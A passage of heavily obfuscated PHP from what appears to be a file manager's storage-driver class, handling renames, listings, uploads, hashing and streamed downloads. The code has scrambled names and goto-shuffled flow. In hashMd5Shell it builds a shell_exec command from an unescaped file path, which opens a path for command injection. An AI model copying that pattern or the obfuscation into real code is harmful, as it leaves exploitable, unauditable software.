str_replace($A„Ö°Á”½ƒ[72], $A„Ö°Á”½ƒ[33], get_class($this)); return strtolower($c Ã²‹µ¼ñ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($A Ã¯ëî’, $AµäÑÔ‰á) { $c¬›«Úòƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EøõƒëŞ = rtrim($A Ã¯ëî’, $c¬›«Úòƒ[8]) . $c¬›«Úòƒ[8] . $AµäÑÔ‰á; $eîÖê²Ñ¢È = $this->exist($EøõƒëŞ); return $eîÖê²Ñ¢È ? $EøõƒëŞ : !1; } public function setModifyTime($bÁ½–ß£‘, $eŞ©Å™„Ò = '') { } public function renameObject($c»«Â„İÖ‡, $Eïá’Û­¸§) { goto DĞÖ—ÅËˆ¡; C×ôªò¹ïÀ: return $fğÆ¼–ì¢ ? $Eïá’Û­¸§ : !1; goto aœèÎÌ°ÀŸ; DĞÖ—ÅËˆ¡: $eÛ¿ ³‰’í =& $_SERVER[ÒÆ›ÆØÎ¾]; $Aƒ·Íì²Á¡ = $Eïá’Û­¸§; Hook::trigger($eÛ¿ ³‰’í[73], $this, $c»«Â„İÖ‡, $this, $this->pathFather($c»«Â„İÖ‡) . $Eïá’Û­¸§); goto B‚Òªøœ“; B‚Òªøœ“: $c»«Â„İÖ‡ = $this->getPathOuter($c»«Â„İÖ‡); $Eïá’Û­¸§ = $this->pathFather($c»«Â„İÖ‡) . $Eïá’Û­¸§; if (IO::isFile($c»«Â„İÖ‡)) { $fğÆ¼–ì¢ = IO::copy($c»«Â„İÖ‡, $this->pathFather($c»«Â„İÖ‡), REPEAT_RENAME_FOLDER, $Aƒ·Íì²Á¡); if ($fğÆ¼–ì¢) { IO::remove($c»«Â„İÖ‡); } } else { $fğÆ¼–ì¢ = IO::mkdir($Eïá’Û­¸§); if (!$fğÆ¼–ì¢) { return !1; } $C÷âôÒ¥ = IO::listPath($c»«Â„İÖ‡, !0); $f­ô†ãŒÉÁ = array_merge($C÷âôÒ¥[$eÛ¿ ³‰’í[74]], $C÷âôÒ¥[$eÛ¿ ³‰’í[75]]); foreach ($f­ô†ãŒÉÁ as $fƒÄØ¨¸§ğ) { IO::move($fƒÄØ¨¸§ğ[$eÛ¿ ³‰’í[76]], $Eïá’Û­¸§, REPEAT_RENAME_FOLDER); } IO::remove($c»«Â„İÖ‡); } goto C×ôªò¹ïÀ; aœèÎÌ°ÀŸ: } public function tempFile($F„‘ç¨˜âÜ = '', $Bò’×º¯¼î = '') { goto CÑ„æ¥Íùù; CÑ„æ¥Íùù: if (!$F„‘ç¨˜âÜ) { $F„‘ç¨˜âÜ = rand_string(15); } $f»Ùõ—Š¾ì = TEMP_FILES . rand_string(15) . $_SERVER[ÒÆ›ÆØÎ¾][8]; @mkdir($f»Ùõ—Š¾ì, 511, !0); goto Aˆ¢¶É”; Aˆ¢¶É”: $a¬‡ç’¼™Æ = $f»Ùõ—Š¾ì . $F„‘ç¨˜âÜ; @touch($a¬‡ç’¼™Æ); if ($Bò’×º¯¼î) { file_put_contents($a¬‡ç’¼™Æ, $Bò’×º¯¼î); } goto AÜ¾÷“ÄŞ; AÜ¾÷“ÄŞ: return $a¬‡ç’¼™Æ; goto C´¢—Õ•; C´¢—Õ•: } public function tempFileRemve($aáÎŒ‘À‚) { @unlink($aáÎŒ‘À‚); @rmdir($this->pathFather($aáÎŒ‘À‚)); } public function mkfile($eï”Ñ„î¬å, $A²·º‡­†Ò = '', $Cê‹¼õà›… = REPEAT_RENAME) { } public function mkdir($dÉ§ˆ¯·Ò‡, $fï×Ÿ°Œ = REPEAT_SKIP) { } public function delFile($aÓ÷±ˆĞ–) { } public function delFolder($eªø­»ÏÕ½) { } public function copyFile($Aø’»³²¹×, $C´“‚œŒÃÏ) { } public function moveFile($b’ÖòŞŠ‚, $CĞ©Øµ“Ü) { } public function remove($f…Ø¥Ê­) { if ($this->isFile($f…Ø¥Ê­)) { return $this->delFile($f…Ø¥Ê­); } return $this->delFolder($f…Ø¥Ê­); } public function rename($e¾Á£ˆ«°¢, $a¦Š“ó‹Ï‡) { } public function exist($c•ç¬«ìâç) { } public function findByHash($C“„„®¹˜ = '', $f˜Î¦ªŞïò = '') { return !1; } public function isFile($Bª¼æ—‡±Ú) { } public function isFolder($e»ëóÊÅ”ä) { } public function size($a›øÂİÏŒª) { } public function info($D¤öîøš‚É) { } public function infoSimple($f±ò³¡‹) { return $this->info($f±ò³¡‹); } public function infoAuth($cğŒĞÄ‘ÂÍ) { return $this->info($cğŒĞÄ‘ÂÍ); } public function infoFull($a«ë»¡‹) { return $this->info($a«ë»¡‹); } public function infoWithChildren($aß¢öÖÎ) { $BçÁšª¡İ =& $_SERVER[ÒÆ›ÆØÎ¾]; static $aßĞ‚â–Ìö = array(); if (isset($aßĞ‚â–Ìö[$aß¢öÖÎ])) { return $aßĞ‚â–Ìö[$aß¢öÖÎ]; } $Bß®İ´âÏº = $this->info($aß¢öÖÎ); if ($Bß®İ´âÏº && $Bß®İ´âÏº[$BçÁšª¡İ[29]] == $BçÁšª¡İ[77]) { $Aéßïæå© = array($BçÁšª¡İ[78] => 0, $BçÁšª¡İ[79] => 0, $BçÁšª¡İ[80] => 0); $this->infoChildren($aß¢öÖÎ, $Aéßïæå©); $Bß®İ´âÏº[$BçÁšª¡İ[78]] = $Aéßïæå©[$BçÁšª¡İ[78]]; $Bß®İ´âÏº[$BçÁšª¡İ[81]] = array($BçÁšª¡İ[82] => $Aéßïæå©[$BçÁšª¡İ[79]], $BçÁšª¡İ[83] => $Aéßïæå©[$BçÁšª¡İ[80]]); $aßĞ‚â–Ìö[$aß¢öÖÎ] = $Bß®İ´âÏº; } return $Bß®İ´âÏº; } public function listPath($F¿‘ ±°ã, $EÌ·©™äæö = false) { } public function has($e…„äÉ–¦±, $aß¢Ïö‡÷ = false, $E×õèÌäë = false) { } public function canRead($AÖÏ¨È¬Ñà) { } public function canWrite($C•õš¼áš) { } public function getContent($b ³›ÕíÄ˜) { } public function setContent($FÎŒá”Ï§, $e¿Ã†„„½ = '') { } protected function infoChildren($FÑ¾Ÿ‹¤, &$dØî†Æ¸Â«) { $Aì²õ‹‡ =& $_SERVER[ÒÆ›ÆØÎ¾]; check_abort_echo(); $bïæ¯½Ä·á = $this->listPath($FÑ¾Ÿ‹¤, !0); $bïæ¯½Ä·á = array_merge($bïæ¯½Ä·á[$Aì²õ‹‡[75]], $bïæ¯½Ä·á[$Aì²õ‹‡[74]]); foreach ($bïæ¯½Ä·á as $EÓƒÖ…‡‚) { if ($EÓƒÖ…‡‚[$Aì²õ‹‡[29]] == $Aì²õ‹‡[77]) { $dØî†Æ¸Â«[$Aì²õ‹‡[80]]++; $Aè´Şç½ØÈ = $this->getPathInner($EÓƒÖ…‡‚[$Aì²õ‹‡[76]]); $this->infoChildren($Aè´Şç½ØÈ, $dØî†Æ¸Â«); } else { $dØî†Æ¸Â«[$Aì²õ‹‡[79]]++; $dØî†Æ¸Â«[$Aì²õ‹‡[78]] += $EÓƒÖ…‡‚[$Aì²õ‹‡[78]]; } } } public function fileSubstr($DĞÒƒÑ²¾Î, $DÁœ÷»‰®, $añºØ©½á) { } public function listAll($AÊæğ¶ô¨…) { } public function listAllMake($bÃåèó«Ô², &$fß˜¯ØÌ¦Ô) { $d¥ˆ»²éÅƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; check_abort_echo(); $e¶Ö…Ñ…£ = $this->listPath($bÃåèó«Ô², !0); if (!$e¶Ö…Ñ…£) { return; } $F…ƒëÒÃ½Ö = array_merge($e¶Ö…Ñ…£[$d¥ˆ»²éÅƒ[75]], $e¶Ö…Ñ…£[$d¥ˆ»²éÅƒ[74]]); foreach ($F…ƒëÒÃ½Ö as $F•¢®ƒË×ƒ) { goto C–ÓÜÀÏ®ç; C–ÓÜÀÏ®ç: $E•£ƒŞøíœ = $F•¢®ƒË×ƒ[$d¥ˆ»²éÅƒ[29]] == $d¥ˆ»²éÅƒ[77]; $c¢£¬÷‹¹ = array($d¥ˆ»²éÅƒ[76] => $F•¢®ƒË×ƒ[$d¥ˆ»²éÅƒ[76]], $d¥ˆ»²éÅƒ[77] => $E•£ƒŞøíœ); if (isset($F•¢®ƒË×ƒ[$d¥ˆ»²éÅƒ[78]])) { $c¢£¬÷‹¹[$d¥ˆ»²éÅƒ[78]] = $F•¢®ƒË×ƒ[$d¥ˆ»²éÅƒ[78]]; } goto f¹„Şë¢¬ö; f¹„Şë¢¬ö: if (isset($F•¢®ƒË×ƒ[$d¥ˆ»²éÅƒ[84]])) { $c¢£¬÷‹¹[$d¥ˆ»²éÅƒ[84]] = $F•¢®ƒË×ƒ[$d¥ˆ»²éÅƒ[84]]; } if (!$E•£ƒŞøíœ) { $fß˜¯ØÌ¦Ô[] = $c¢£¬÷‹¹; continue; } $fß˜¯ØÌ¦Ô[] = $c¢£¬÷‹¹; goto d‡ƒÀŞÇ‡; d‡ƒÀŞÇ‡: $this->listAllMake($F•¢®ƒË×ƒ[$d¥ˆ»²éÅƒ[76]], $fß˜¯ØÌ¦Ô); goto Fˆæ‰İĞëÀ; Fˆæ‰İĞëÀ: } } public function listAllSimple($fî‹’¤ê») { $C„ÌøˆñÓÀ =& $_SERVER[ÒÆ›ÆØÎ¾]; $c¼ˆ™»„® = array(); $dæ öƒÔ = $this->listAll($fî‹’¤ê»); $dĞé‡…Ù‰˜ = $this->getPathOuter($fî‹’¤ê»); foreach ($dæ öƒÔ as $d´Î”–õê‡) { goto Fì–•ÑÎÂœ; f½­™ÜĞÕ: if (!$d´Î”–õê‡[$C„ÌøˆñÓÀ[77]]) { $Bîğ¤»›İ³[$C„ÌøˆñÓÀ[86]] = $Fö±Úïå­•; } $c¼ˆ™»„®[] = $Bîğ¤»›İ³; goto D‰øóä¤Ûô; Fì–•ÑÎÂœ: $Fö±Úïå­• = $d´Î”–õê‡[$C„ÌøˆñÓÀ[76]]; $C¼âÔ¤Á® = $d´Î”–õê‡[$C„ÌøˆñÓÀ[76]]; if (isset($d´Î”–õê‡[$C„ÌøˆñÓÀ[85]])) { $Fö±Úïå­• = $d´Î”–õê‡[$C„ÌøˆñÓÀ[85]][$C„ÌøˆñÓÀ[76]]; $d´Î”–õê‡[$C„ÌøˆñÓÀ[78]] = $d´Î”–õê‡[$C„ÌøˆñÓÀ[85]][$C„ÌøˆñÓÀ[78]]; $d´Î”–õê‡[$C„ÌøˆñÓÀ[84]] = $d´Î”–õê‡[$C„ÌøˆñÓÀ[85]][$C„ÌøˆñÓÀ[84]]; } else { $C¼âÔ¤Á® = substr($d´Î”–õê‡[$C„ÌøˆñÓÀ[76]], strlen(get_path_father($dĞé‡…Ù‰˜))); $C¼âÔ¤Á® = $C„ÌøˆñÓÀ[8] . ltrim($C¼âÔ¤Á®, $C„ÌøˆñÓÀ[8]); } goto D‡Æ‚±¯·½; D‡Æ‚±¯·½: $Bîğ¤»›İ³ = array($C„ÌøˆñÓÀ[76] => $C¼âÔ¤Á®, $C„ÌøˆñÓÀ[77] => $d´Î”–õê‡[$C„ÌøˆñÓÀ[77]]); if (isset($d´Î”–õê‡[$C„ÌøˆñÓÀ[78]]) && !$d´Î”–õê‡[$C„ÌøˆñÓÀ[77]]) { $Bîğ¤»›İ³[$C„ÌøˆñÓÀ[78]] = $d´Î”–õê‡[$C„ÌøˆñÓÀ[78]]; } if (isset($d´Î”–õê‡[$C„ÌøˆñÓÀ[84]])) { $Bîğ¤»›İ³[$C„ÌøˆñÓÀ[84]] = $d´Î”–õê‡[$C„ÌøˆñÓÀ[84]]; } goto f½­™ÜĞÕ; D‰øóä¤Ûô: } return $c¼ˆ™»„®; } public function upload($a‰ÒÃô•šî, $F…ê§á‹ÜÚ, $Aîåñ’ï = false, $bİœö ¸´ = REPEAT_REPLACE) { } public function uploadFileByID($CóÂƒËÂ, $Fß®í•½Ï÷, $B±Ü‘œã™) { } public function uploadFileByPath($Eˆ¾’¼ à, $Eó¢‚¨èÍ, $b›Ûì¢êĞá = array()) { } public function isUploadServer() { $B˜ùÜ‹‘Áœ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $B˜ùÜ‹‘Áœ[87]) { return !0; } return $GLOBALS[$B˜ùÜ‹‘Áœ[6]][$B˜ùÜ‹‘Áœ[88]][$B˜ùÜ‹‘Áœ[89]]; } public function isFileOutServer() { $BÔÁ¾»›Ù =& $_SERVER[ÒÆ›ÆØÎ¾]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $BÔÁ¾»›Ù[87]) { return !0; } return $GLOBALS[$BÔÁ¾»›Ù[6]][$BÔÁ¾»›Ù[88]][$BÔÁ¾»›Ù[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($DÅç”áÂö) { $CõŞÖ„„ÚŸ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->isCdnHost()) { return $DÅç”áÂö; } return str_replace(trim(get_url_root($DÅç”áÂö), $CõŞÖ„„ÚŸ[8]), trim($this->cdnHost, $CõŞÖ„„ÚŸ[8]), $DÅç”áÂö); } public function uploadLink($A ‰İÃÒëŞ, $CÆß¨°éËî = 0) { goto bÈÆøñ»Ì; aÀ‰«íÎº: if (!in_array($a°Æ¢·õÂß, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $AµîÆ—ªËØ = 1024 * 1024 * 10; goto AÇçóğ¾ä; F’¿ÉØÜÀ: if ($bê–Ê¾÷Ú) { $bê–Ê¾÷Ú[$f‚Õ¬ô×¡[93]] = $A ‰İÃÒëŞ; $bê–Ê¾÷Ú[$f‚Õ¬ô×¡[94]] = $a°Æ¢·õÂß; } return $bê–Ê¾÷Ú; goto F©…àáèƒ; bÈÆøñ»Ì: $f‚Õ¬ô×¡ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($this->isUploadServer()) { return; } $a°Æ¢·õÂß = $this->getType(); goto aÀ‰«íÎº; AÇçóğ¾ä: $F¾‘™Šˆ¡ = $CÆß¨°éËî <= $AµîÆ—ªËØ ? $f‚Õ¬ô×¡[91] : $f‚Õ¬ô×¡[92]; $EÛ¶öìíŒ– = (!$CÆß¨°éËî ? 1 : ceil($CÆß¨°éËî / pow(1024, 3))) * 3600 * 4; $bê–Ê¾÷Ú = $this->{$F¾‘™Šˆ¡}($A ‰İÃÒëŞ, $EÛ¶öìíŒ–); goto F’¿ÉØÜÀ; F©…àáèƒ: } public function uploadFormData($fÕ‡ã¦™á, $aÖ‰©×É = 3600) { } public function multiUploadFormData($A’ØèÆá¡Í, $B½ï˜ÄÛò = 3600) { } public function download($BìãĞÜŒŞ¥, $BÖ…™“Ñ‘å) { } public function ext($dË›â‹ÎŠ) { $CåğéŸô… =& $_SERVER[ÒÆ›ÆØÎ¾]; if (strpos($dË›â‹ÎŠ, $CåğéŸô…[8]) === -1) { $a¶èèéî™” = $dË›â‹ÎŠ; } else { $a¶èèéî™” = $this->pathThis($dË›â‹ÎŠ); } $D„ï·å¿Öæ = $CåğéŸô…[33]; if (strstr($a¶èèéî™”, $CåğéŸô…[95])) { $D„ï·å¿Öæ = substr($a¶èèéî™”, strrpos($a¶èèéî™”, $CåğéŸô…[95]) + 1); $D„ï·å¿Öæ = strtolower($D„ï·å¿Öæ); } if (strlen($D„ï·å¿Öæ) > 3 && preg_match($CåğéŸô…[96], $D„ï·å¿Öæ, $b¦¡¦àÊÃù)) { $D„ï·å¿Öæ = $CåğéŸô…[33]; } return $D„ï·å¿Öæ; } public function pathThis($b„´”Ö¯÷á) { $Eç÷Ü½‚°Î =& $_SERVER[ÒÆ›ÆØÎ¾]; $b„´”Ö¯÷á = str_replace($Eç÷Ü½‚°Î[97], $Eç÷Ü½‚°Î[8], rtrim($b„´”Ö¯÷á, $Eç÷Ü½‚°Î[8])); $AÛÇÒÊï = strrpos($b„´”Ö¯÷á, $Eç÷Ü½‚°Î[8]); if ($AÛÇÒÊï === !1) { return $b„´”Ö¯÷á; } return substr($b„´”Ö¯÷á, $AÛÇÒÊï + 1); } public function pathFather($F†ŠÏ¿‰…Š) { $a³¥Ìõˆ‰ğ =& $_SERVER[ÒÆ›ÆØÎ¾]; $F†ŠÏ¿‰…Š = str_replace($a³¥Ìõˆ‰ğ[97], $a³¥Ìõˆ‰ğ[8], rtrim($F†ŠÏ¿‰…Š, $a³¥Ìõˆ‰ğ[8])); $C£‘‡ØÈ¤ë = strrpos($F†ŠÏ¿‰…Š, $a³¥Ìõˆ‰ğ[8]); if ($C£‘‡ØÈ¤ë === !1) { return $a³¥Ìõˆ‰ğ[33]; } return substr($F†ŠÏ¿‰…Š, 0, $C£‘‡ØÈ¤ë + 1); } public function hashSimple($C½•«”êŸ) { goto fëŸÔÊÈÛ; fëŸÔÊÈÛ: $FšööéÑ§Ë =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$C½•«”êŸ) { return md5($FšööéÑ§Ë[33]); } $f÷Å«×Ä±œ = $this->size($C½•«”êŸ); goto CÂ°¹¢Ÿ¸Ô; dÍ¸ÁİĞ’—: $BÆÃğíî† .= $this->fileSubstr($C½•«”êŸ, $f÷Å«×Ä±œ - $f‘ÌÛ¦°‰Ï, $f‘ÌÛ¦°‰Ï); return md5($BÆÃğíî†) . $f÷Å«×Ä±œ; goto e‰³…ÏÜøÔ; CÂ°¹¢Ÿ¸Ô: $f‘ÌÛ¦°‰Ï = 200; $dÉ›ÀéƒÓõ = 50; if ($f÷Å«×Ä±œ <= $f‘ÌÛ¦°‰Ï * $dÉ›ÀéƒÓõ) { return $this->hashMd5($C½•«”êŸ) . $f÷Å«×Ä±œ; } goto Eîãœ†‰†; Eîãœ†‰†: $DÖÌÄÂ»í‡ = intval($f÷Å«×Ä±œ / $dÉ›ÀéƒÓõ); $BÆÃğíî† = $FšööéÑ§Ë[33]; for ($b¤ˆ°‡®Ì = 0; $b¤ˆ°‡®Ì < $dÉ›ÀéƒÓõ; $b¤ˆ°‡®Ì++) { $BÆÃğíî† .= $this->fileSubstr($C½•«”êŸ, $DÖÌÄÂ»í‡ * $b¤ˆ°‡®Ì, $f‘ÌÛ¦°‰Ï); } goto dÍ¸ÁİĞ’—; e‰³…ÏÜøÔ: } public static $md5Cache = array(); public function hashMd5($f›¡ÉùÂ—Š) { $f›¡ÉùÂ—Š = $this->iconvSystem($f›¡ÉùÂ—Š); if (isset(self::$md5Cache[$f›¡ÉùÂ—Š])) { return self::$md5Cache[$f›¡ÉùÂ—Š]; } self::$md5Cache[$f›¡ÉùÂ—Š] = $this->hashMd5Shell($f›¡ÉùÂ—Š); if (!self::$md5Cache[$f›¡ÉùÂ—Š]) { self::$md5Cache[$f›¡ÉùÂ—Š] = @md5_file($f›¡ÉùÂ—Š); } return self::$md5Cache[$f›¡ÉùÂ—Š]; } private function hashMd5Shell($eŸ‡Ê¼ŒÅ) { goto Eá¡œÄÕï‡; Eá¡œÄÕï‡: $dÖ¡È¿³Â =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!function_exists($dÖ¡È¿³Â[98])) { return !1; } $b‹ùèÆ˜µÇ = array($dÖ¡È¿³Â[99], $dÖ¡È¿³Â[100]); goto C´ÅŞ½‡ã•; A»çŠÅİ’Ò: $c·Ï‚ÚÇª† = shell_exec($cé­î”ƒ•­ . "\40\42{$eŸ‡Ê¼ŒÅ}\42"); $c·Ï‚ÚÇª† = str_replace($dÖ¡È¿³Â[104], $dÖ¡È¿³Â[33], $c·Ï‚ÚÇª†); return substr($c·Ï‚ÚÇª†, 0, 32); goto dè‘™¤Ş¥; C´ÅŞ½‡ã•: $cé­î”ƒ•­ = Cache::get($dÖ¡È¿³Â[101]); if (!$cé­î”ƒ•­) { $B¹·ìÖŒÎĞ = BASIC_PATH . $dÖ¡È¿³Â[102]; $EñŒ´ÈĞõ± = md5_file($B¹·ìÖŒÎĞ); $cé­î”ƒ•­ = $dÖ¡È¿³Â[103]; foreach ($b‹ùèÆ˜µÇ as $f×Îì¾ˆ) { $c·Ï‚ÚÇª† = shell_exec($f×Îì¾ˆ . "\40\42{$B¹·ìÖŒÎĞ}\x22"); if ($c·Ï‚ÚÇª† && substr(trim($c·Ï‚ÚÇª†), 0, 32) == $EñŒ´ÈĞõ±) { $cé­î”ƒ•­ = $f×Îì¾ˆ; break; } } Cache::set($dÖ¡È¿³Â[101], $cé­î”ƒ•­, 3600); } if ($cé­î”ƒ•­ == $dÖ¡È¿³Â[103]) { return !1; } goto A»çŠÅİ’Ò; dè‘™¤Ş¥: } public function link($DƒƒÉöÆ‹â) { return $DƒƒÉöÆ‹â; } public function fileOut($eà—Æ¦É¾é, $AÛÇŒÌ”±  = false, $eïåƒ¯Ø”‰ = false, $fóæÆí’øå = '') { goto aÀ¹ã†³Ó; FÇ„‡¢‡Îƒ: $Eë«ƒ˜ƒ–„ = get_file_mime($eãì¢Ñ’ù); if (strstr($Eë«ƒ˜ƒ–„, $bÇĞÂ…Ä¡Ã[117])) { $Eë«ƒ˜ƒ–„ = $Eë«ƒ˜ƒ–„ . $bÇĞÂ…Ä¡Ã[118]; } if ($AÛÇŒÌ”±  === !1 && !mime_support($Eë«ƒ˜ƒ–„)) { $AÛÇŒÌ”±  = !0; $Eë«ƒ˜ƒ–„ = $bÇĞÂ…Ä¡Ã[119]; } goto C±¨«Õ™¦–; aÀ¹ã†³Ó: $bÇĞÂ…Ä¡Ã =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->cacheMethod(null, null); if (!$eà—Æ¦É¾é || !$this->exist($eà—Æ¦É¾é)) { show_json(LNG($bÇĞÂ…Ä¡Ã[105]), !1, $eïåƒ¯Ø”‰); } goto cØÆùµ¼î£; AĞ¥Ê¸İã¶: if ($_SERVER[$bÇĞÂ…Ä¡Ã[157]] == $bÇĞÂ…Ä¡Ã[158]) { return; } $DôÑ’¡¬ë = 1024 * 100; $CÚ–¨ßÃôŠ = 0; goto CÓõ˜ëİ ¢; aìƒÌÂ³„Ô: $b®»™Ì®Œ— = $bÇĞÂ…Ä¡Ã[116] . $b®»™Ì®Œ— . $bÇĞÂ…Ä¡Ã[122] . $b®»™Ì®Œ—; if ($AÛÇŒÌ”± ) { header($bÇĞÂ…Ä¡Ã[123]); header($bÇĞÂ…Ä¡Ã[124] . $b®»™Ì®Œ—); } else { header($bÇĞÂ…Ä¡Ã[125] . $b®»™Ì®Œ—); } header($bÇĞÂ…Ä¡Ã[126] . gmdate($bÇĞÂ…Ä¡Ã[110], time() + 3600 * 24 * 30) . $bÇĞÂ…Ä¡Ã[127]); goto FÍÖÏòÄöå; C±¨«Õ™¦–: header($bÇĞÂ…Ä¡Ã[120]); header($bÇĞÂ…Ä¡Ã[121] . $Eë«ƒ˜ƒ–„); $b®»™Ì®Œ— = rawurlencode($F‹›¾‹®ª¹); goto aìƒÌÂ³„Ô; CéÀÅÎà: header($bÇĞÂ…Ä¡Ã[135] . $A¶à…©™¯„ . $bÇĞÂ…Ä¡Ã[127]); header($bÇĞÂ…Ä¡Ã[136] . $F‹›¾‹®ª¹); header($bÇĞÂ…Ä¡Ã[137]); goto Aª¡¼Ğ¨ŠŠ; Fä†’×º: $EÚš¡ñÑò´ = strtolower($_SERVER[$bÇĞÂ…Ä¡Ã[142]]); if ($eïìÛÜªÓë && $EÚš¡ñÑò´ && $aÍ¸ƒ ¯ì) { if (strstr($EÚš¡ñÑò´, $bÇĞÂ…Ä¡Ã[143])) { header($bÇĞÂ…Ä¡Ã[144] . $eà—Æ¦É¾é); } else { if (strstr($EÚš¡ñÑò´, $bÇĞÂ…Ä¡Ã[145])) { header($bÇĞÂ…Ä¡Ã[146] . $eà—Æ¦É¾é); } else { if (strstr($EÚš¡ñÑò´, $bÇĞÂ…Ä¡Ã[147])) { header($bÇĞÂ…Ä¡Ã[148] . $eà—Æ¦É¾é); } } } if ($Cë™Æí¤‰±) { header($bÇĞÂ…Ä¡Ã[149] . $Cë™Æí¤‰±); } return; } if (isset($_SERVER[$bÇĞÂ…Ä¡Ã[150]])) { if (preg_match($bÇĞÂ…Ä¡Ã[151], $_SERVER[$bÇĞÂ…Ä¡Ã[150]], $Dè¿Ï‡½ÚÆ)) { $BÁåÂÅ»Ò = intval($Dè¿Ï‡½ÚÆ[1]); if (!empty($Dè¿Ï‡½ÚÆ[2])) { $E†çøÑËíá = intval($Dè¿Ï‡½ÚÆ[2]); } } header($bÇĞÂ…Ä¡Ã[152]); header("\103\x6f\156\x74\145\x6e\164\x2d\x52\141\156\147\145\72\x20\x62\x79\x74\x65\x73\x20{$BÁåÂÅ»Ò}\x2d{$E†çøÑËíá}\x2f" . $C¹œš¼Áò); } else { header($bÇĞÂ…Ä¡Ã[153]); } goto A‚šĞµ¡˜¥; aÀ×Ä†õÙ‘: $C¹œš¼Áò = $c³¸”ëÍ×Ü[$bÇĞÂ…Ä¡Ã[78]]; $A¶à…©™¯„ = gmdate($bÇĞÂ…Ä¡Ã[110], $c³¸”ëÍ×Ü[$bÇĞÂ…Ä¡Ã[84]]); $F‹›¾‹®ª¹ = $eïåƒ¯Ø”‰ ? $eïåƒ¯Ø”‰ : $this->iconvApp($c³¸”ëÍ×Ü[$bÇĞÂ…Ä¡Ã[28]]); goto bœ«Úµ©Ï…; fî¤æÑ–„Â: if (isset($_SERVER[$bÇĞÂ…Ä¡Ã[131]]) && strtotime($_SERVER[$bÇĞÂ…Ä¡Ã[131]]) == $c³¸”ëÍ×Ü[$bÇĞÂ…Ä¡Ã[84]]) { header($bÇĞÂ…Ä¡Ã[132], !0, 304); die; } if (isset($_SERVER[$bÇĞÂ…Ä¡Ã[133]]) && $_SERVER[$bÇĞÂ…Ä¡Ã[133]] == $fóæÆí’øå) { header($bÇĞÂ…Ä¡Ã[134] . $fóæÆí’øå, !0, 304); die; } header($bÇĞÂ…Ä¡Ã[134] . $fóæÆí’øå); goto CéÀÅÎà; Dã±æ­İ¤Ã: @ob_end_clean(); set_timeout(); $c³¸”ëÍ×Ü = $this->infoFull($eà—Æ¦É¾é); goto aÀ×Ä†õÙ‘; Aª¡¼Ğ¨ŠŠ: header($bÇĞÂ…Ä¡Ã[138] . $C¹œš¼Áò); header($bÇĞÂ…Ä¡Ã[139]); if (!$AÛÇŒÌ”±  && $eãì¢Ñ’ù == $bÇĞÂ…Ä¡Ã[140]) { if ($C¹œš¼Áò > 1024 * 1024 * 5) { die; } $bŠè‹¶Èò = $this->getContent($eà—Æ¦É¾é); $bŠè‹¶Èò = Html::clearSVG($bŠè‹¶Èò); header($bÇĞÂ…Ä¡Ã[141] . strlen($bŠè‹¶Èò)); echo $bŠè‹¶Èò; die; } goto Fä†’×º; FÍÖÏòÄöå: header($bÇĞÂ…Ä¡Ã[128]); header($bÇĞÂ…Ä¡Ã[129]); header($bÇĞÂ…Ä¡Ã[130]); goto fî¤æÑ–„Â; bœ«Úµ©Ï…: $BÁåÂÅ»Ò = 0; $E†çøÑËíá = $C¹œš¼Áò - 1; $eãì¢Ñ’ù = $this->ext($F‹›¾‹®ª¹); goto CÏŸŞ›å“; cØÆùµ¼î£: $eïìÛÜªÓë = $this->getType() == $bÇĞÂ…Ä¡Ã[106]; $aÍ¸ƒ ¯ì = $GLOBALS[$bÇĞÂ…Ä¡Ã[6]][$bÇĞÂ…Ä¡Ã[88]][$bÇĞÂ…Ä¡Ã[107]][$bÇĞÂ…Ä¡Ã[108]]; $Cë™Æí¤‰± = (double) $GLOBALS[$bÇĞÂ…Ä¡Ã[6]][$bÇĞÂ…Ä¡Ã[88]][$bÇĞÂ…Ä¡Ã[107]][$bÇĞÂ…Ä¡Ã[109]] * 1024 * 1024; goto Dã±æ­İ¤Ã; CÓõ˜ëİ ¢: if ($Cë™Æí¤‰±) { $CÚ–¨ßÃôŠ = intval(1000 * 1000 * ($DôÑ’¡¬ë / $Cë™Æí¤‰±)); } while ($BÁåÂÅ»Ò <= $E†çøÑËíá) { $EÔöÓñòòØ = timeFloat(); check_abort(); $c¶äÎÀ‰¦Ï = $E†çøÑËíá - $BÁåÂÅ»Ò + 1; if ($c¶äÎÀ‰¦Ï <= $DôÑ’¡¬ë) { $DôÑ’¡¬ë = $c¶äÎÀ‰¦Ï; } echo $this->fileSubstr($eà—Æ¦É¾é, $BÁåÂÅ»Ò, $DôÑ’¡¬ë); $BÁåÂÅ»Ò += $DôÑ’¡¬ë; if ($DôÑ’¡¬ë == $c¶äÎÀ‰¦Ï) { $BÁåÂÅ»Ò = $E†çøÑËíá + 1; } if ($CÚ–¨ßÃôŠ) { $fóÌĞ¤ˆÚ³ = intval(1000 * 1000 * (timeFloat() - $EÔöÓñòòØ)); $eÑæˆ´ˆ‘ñ = $CÚ–¨ßÃôŠ - $fóÌĞ¤ˆÚ³; if ($eÑæˆ´ˆ‘ñ > 5) { usleep($eÑæˆ´ˆ‘ñ); } } } goto Aà ê‹½Œ; CÏŸŞ›å“: if (in_array($eãì¢Ñ’ù, array($bÇĞÂ…Ä¡Ã[111], $bÇĞÂ…Ä¡Ã[112], $bÇĞÂ…Ä¡Ã[113], $bÇĞÂ…Ä¡Ã[114]))) { $eãì¢Ñ’ù = $bÇĞÂ…Ä¡Ã[115]; } if (!$fóæÆí’øå) { $fóæÆí’øå = md5($A¶à…©™¯„ . $this->hashSimple($eà—Æ¦É¾é)); } $fóæÆí’øå = $bÇĞÂ…Ä¡Ã[116] . $fóæÆí’øå . $bÇĞÂ…Ä¡Ã[116]; goto FÇ„‡¢‡Îƒ; A‚šĞµ¡˜¥: $e¬õÄ´µÓá = !0; if ($_SERVER[$bÇĞÂ…Ä¡Ã[154]] == $bÇĞÂ…Ä¡Ã[155] && $C¹œš¼Áò > 1204 * 